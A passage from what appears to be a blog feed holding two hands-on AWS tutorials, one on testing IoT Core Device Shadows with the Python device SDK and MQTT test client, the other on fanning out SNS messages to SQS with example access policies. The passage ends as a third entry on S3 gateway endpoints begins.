class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Remember, this policy must have adequate permissions for <code>CONNECT</code>, <code>SUBSCRIBE</code>, <code>Publish</code> and <code>Publish</code><br>to the Shadow topic.</p><p>Once you have setup these stuff, now I need to convey the certificate to the EC2 instance.</p><p><img src="https://i.imgur.com/LKSyMJw.png" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i &lt;SSH KEY&gt; TestDeviceShadow/*    ubuntu@ec2-&lt;EC2 Public Address&gt;.compute-1.amazonaws.com:/home/ubuntu/certs</span><br></pre></td></tr></table></figure><p>Apart from the device certificate, it is necessary to provide the CA certificate in the device.</p><ul><li>Download the CA Cert in the device</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd certs/</span><br><span class="line">curl -o ~/certs/Amazon-root-CA-1.pem \</span><br><span class="line">    https://www.amazontrust.com/repository/AmazonRootCA1.pem </span><br></pre></td></tr></table></figure><p>Now there all credential we need to test the IoT Device Shadows</p><h2 id="Install-the-IoT-Core-Python-Device-SDK"><a href="#Install-the-IoT-Core-Python-Device-SDK" class="headerlink" title="Install the IoT Core Python Device SDK"></a>Install the IoT Core Python Device SDK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/aws-iot-device-sdk-python-v2/samples</span><br></pre></td></tr></table></figure><h2 id="Execute-the-shadow-py"><a href="#Execute-the-shadow-py" class="headerlink" title="Execute the shadow.py"></a>Execute the shadow.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shadow.py --ca_file ~/certs/Amazon-root-CA-1.pem --cert ~/certs/device.pem.crt --key ~/certs/private.pem.key --endpoint your-iot-endpoint --thing_name your-iot-thing-name</span><br></pre></td></tr></table></figure><blockquote><p>You can derive the iot endpoint by checking the AWS IoT Console<br>Find the <strong>Connect</strong> &gt; <strong>Connect One Device</strong> in the left pane<br>Scroll down and you will see the IoT endpoint</p></blockquote><p><img src="https://i.imgur.com/mDBpV7l.png" alt="Imgur"></p><p>Back to the script, after you execute the <code>shadow.py</code>, you will see the prompt in your terminal</p><p><img src="https://i.imgur.com/necUKaZ.png" alt="Imgur"></p><p>You will need to enter the desired value. So I enter “yellow”.</p><p><img src="https://i.imgur.com/CQOkk83.png" alt="Imgur"></p><p>Then you can observe that the state changed to “yellow”. This results may also observe from the AWS IoT Console</p><blockquote><p>Go to Things, and select your thing object, on the bottem of the target thing page, you can navigate to the <strong>Device Shadow</strong> tab, then select the <strong>Classic Shadow</strong>, then you can see the Device Shadow State below</p></blockquote><p><img src="https://i.imgur.com/KTfooA1.png" alt="Imgur"></p><p><img src="https://i.imgur.com/Xcu4BKk.png" alt="Imgur"></p><p>For testing, I enter “green” as the input of <code>shadow.py</code>.</p><p>And the state change show in both terminal and IoT Console</p><p><img src="https://i.imgur.com/AEEMMCa.png" alt="Imgur"></p><p><img src="https://i.imgur.com/BWi4UZh.png" alt="Imgur"></p><h2 id="Test-the-Shadow-Document"><a href="#Test-the-Shadow-Document" class="headerlink" title="Test the Shadow Document"></a>Test the Shadow Document</h2><p>Now you can try to edit the Shadow Document directly.</p><p>For example, I change the desired state from red to green.</p><p>Then you will notice that the change will reflect to the <strong>Delta report</strong>.</p><p><img src="https://i.imgur.com/9l40PXT.png" alt="Imgur"></p><h2 id="Test-with-AWS-IoT-Test-MQTT-Client"><a href="#Test-with-AWS-IoT-Test-MQTT-Client" class="headerlink" title="Test with AWS IoT Test MQTT Client"></a>Test with AWS IoT Test MQTT Client</h2><p>First, it is necessary to subscribe to the shadow topic in the MQTT client, for receiving the state change events.</p><p><img src="https://i.imgur.com/Zq4x4i8.png" alt="Imgur"></p><p>The client can subscribe to the topic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$aws/things/ESP32/shadow/update/#</span><br></pre></td></tr></table></figure><p>The wildcard symbol <strong>“#”</strong> indicates that it wants to subscribe all topic under the <code>update/</code> prefix.</p><p>And you can re-run the program with new color value. You can find the MQTT client will receive the state change events.</p><p>At first, the color was “red”.</p><blockquote><p>The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;document topic</p></blockquote><p>Then it changed to “green”.</p><blockquote><p> The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted topic<br>Noted that any unsuccessful messages were received on the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;rejected </p></blockquote><p><img src="https://i.imgur.com/brQ3knq.png" alt="Imgur"></p><h2 id="Edit-the-shadow-document-again"><a href="#Edit-the-shadow-document-again" class="headerlink" title="Edit the shadow document again"></a>Edit the shadow document again</h2><p>I change the desired stat value “blue” to “black”.</p><p><img src="https://i.imgur.com/DVKi6Xb.png" alt="Imgur"></p><p>The first received event will be on the delta topic, it means that there are differences between desired state and reported state.</p><p>At the same time, the message will published to the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted for notifying the device to update the state</p><p><img src="https://i.imgur.com/7fewMie.png" alt="Imgur"></p><p>And also published to the shadow document topic for recording.</p><p><img src="https://i.imgur.com/FYULN43.png" alt="Imgur"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;previous&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;current&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">21</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>But the reported state is not “Black”.</p><p>you can see the event published to the accepted topic.</p><p><img src="https://i.imgur.com/pzVidVy.png" alt="Imgur"></p><p>Meanwhile, the message published to the document topic</p><p><img src="https://i.imgur.com/ZKmF0vG.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>You will found the state change from <strong>(Desired: “Blue”, Reported: “Blue”)</strong> to <strong>(Desired: “Black”, Reported: “Blue”)</strong> and the final state is <strong>(Desired: “Black”, Reported: “Black”)</strong>.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[+] Create a virtual device with Amazon EC2 - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html">https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html</a><br>[+] Tutorial: Provisioning your device in AWS IoT - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html">https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html</a><br>[+] Tutorial: Installing the Device SDK and running the sample application for Device Shadows - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html">https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html</a><br>[+] Tutorial: Interacting with Device Shadow using the sample app and the MQTT test client - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html">https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html</a><br>[+] Reserved topics - Shadow topics - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow">https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow</a></p>]]></content>
      
      
      <categories>
          
          <category> Hands-On Practices </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> IoT Shadow </tag>
            
            <tag> MQTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: Amazon SNS Fan out to Amazon SQS</title>
      <link href="/en/posts/efc78ef4.html"/>
      <url>/en/posts/efc78ef4.html</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Amazon SNS offen works well with Amazon SQS, by subscribing SQS to SNS, the SNS service can push messages to SQS. <strong>This may eliminating the need to periodically check or “poll” for updates.</strong></p><h3 id="What-is-Amazon-SQS"><a href="#What-is-Amazon-SQS" class="headerlink" title="What is Amazon SQS?"></a>What is Amazon SQS?</h3><p>By official definition</p><blockquote><p>Amazon SQS is a message queue service used by distributed applications to exchange messages through a polling model, and can be used to decouple sending and receiving components—without requiring each component to be concurrently available. </p></blockquote><h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><blockquote><p>The <strong>Fanout</strong> scenario is when a message published to an SNS topic is replicated and pushed to multiple endpoints, such as Kinesis Data Firehose delivery streams, Amazon SQS queues, HTTP(S) endpoints, and Lambda functions. This allows for parallel asynchronous processing.<br>For example, you can develop an application that publishes a message to an SNS topic whenever an order is placed for a product. Then, SQS queues that are subscribed to the SNS topic receive identical notifications for the new order. An Amazon Elastic Compute Cloud (Amazon EC2) server instance attached to one of the SQS queues can handle the processing or fulfillment of the order. And you can attach another Amazon EC2 server instance to a data warehouse for analysis of all orders received.[1]</p></blockquote><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>Here we will go through each step of fan out to Amazon SQS.</p><p>The initial step is to remember both SNS arn and SQS arn.</p><h3 id="Create-SQS-Queue"><a href="#Create-SQS-Queue" class="headerlink" title="Create SQS Queue"></a>Create SQS Queue</h3><p>First, you’ll need to create a standard queue in SQS console</p><p><img src="https://i.imgur.com/RRffWm5.png" alt="Imgur"></p><p>After creating the standard queue, it will shows the arn.</p><p>Make sure noted this arn, you’ll need to provide this arn when creating the subscriptions</p><h3 id="Create-SNS-Topic"><a href="#Create-SNS-Topic" class="headerlink" title="Create SNS Topic"></a>Create SNS Topic</h3><p>Second, you need to create a SNS topic in the SNS console..</p><p><img src="https://i.imgur.com/ygA6g1P.png" alt="Imgur"></p><p>And again, you’ll need to note the topic arn.</p><h3 id="Provide-Permission-to-SNS-to-send-messages-to-SQS"><a href="#Provide-Permission-to-SNS-to-send-messages-to-SQS" class="headerlink" title="Provide Permission to SNS to send messages to SQS"></a>Provide Permission to SNS to send messages to SQS</h3><p>By default, SNS will not have permission to send messages to SQS, so you need to provide permission to SNS for sending messages.</p><ul><li>Go to SQS Console</li><li>Press “Edit” in the top corner</li><li>Scroll down to the “Access Policy”</li></ul><p><img src="https://i.imgur.com/keRSRlR.png" alt="Imgur"></p><ul><li>Append new statement in the Access Policy</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns.amazonaws.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:SendMessage&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:xxxxxxxxxxxx:QueueforSNS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ArnEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aws:SourceArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:xxxxxxxxxxxx:StandardTopicforSQS&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/UWjKND7.png" alt="Imgur"></p><h3 id="Subscribe-SQS-queue-to-SNS-topic"><a href="#Subscribe-SQS-queue-to-SNS-topic" class="headerlink" title="Subscribe SQS queue to SNS topic"></a>Subscribe SQS queue to SNS topic</h3><p>Now you’ll need to subscribe the SQS queue to the SNS topic.</p><ul><li>Go to SNS console</li><li>Scroll down and choose “Create Subscription”</li></ul><p><img src="https://i.imgur.com/qTEPbQb.png" alt="Imgur"></p><ul><li>Choose your topic arn</li><li>Set the protocal to SQS</li><li>Choose the SQS arn</li></ul><p><img src="https://i.imgur.com/voJqHuB.png" alt="Imgur"></p><p>Once complete, you will notice that the subscripe confirmation also completes. If you create a SQS type subscription by using console, you don’t need confirm the subscription manually.</p><p><img src="https://i.imgur.com/Jr4Brob.png" alt="Imgur"></p><blockquote><p><strong>But if you create a cross-account subscription, you will receive the confirmation url in the SQS queue, and you will need to click the confirmation URL. [3]</strong></p></blockquote><h3 id="Provide-Permission-to-User-for-topic-x2F-queue-operations"><a href="#Provide-Permission-to-User-for-topic-x2F-queue-operations" class="headerlink" title="Provide Permission to User for topic&#x2F;queue operations"></a>Provide Permission to User for topic&#x2F;queue operations</h3><p>You can add permissions to an IAM User to publish SNS messages to a topic.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>And you also need to provide permissions to SQS queue to recieve and delete messages</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue2&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>However,if you want to perform cross-account operations, you will need to provide permissions to the other account.</p><p>For example, if you want to let acount: 111122223333 to publish messages to SNS topic in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>if you want to let acount: 111122223333 to perform receive abd delete messages to queue in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Test-subscription"><a href="#Test-subscription" class="headerlink" title="Test subscription"></a>Test subscription</h3><p>Now we can test the message delivery to the queue.</p><ul><li>Go to the SNS console</li><li>Press “Push Message” in the top right corner </li><li>Enter the message subject and meesage body</li></ul><p><img src="https://i.imgur.com/iu7VJVX.png" alt="Imgur"><br><img src="https://i.imgur.com/ppgfOf0.png" alt="Imgur"></p><ul><li>Go to the SQS console</li><li>Press “Send and Receive Message” in the top right corner</li><li>Scroll down , and press the “Poll for all messages”</li><li>And you’ll find the messages are in polling progress.</li></ul><p><img src="https://i.imgur.com/aYWXVIE.png" alt="Imgur"></p><ul><li>Then the test meesages showed in the console</li></ul><p><img src="https://i.imgur.com/Vj3cCc9.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>We successfully fan out the message from the Amazon SNS to the Amazon SQS. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario">https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html</a><br>[3]<a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Hands-On Practices </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> SNS </tag>
            
            <tag> SQS </tag>
            
            <tag> Publish-Subscribe-Model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: S3 Gateway Endpoints</title>
      <link href="/en/posts/e7e295f6.html"/>
      <url>/en/posts/e7e295f6.html</url>
      
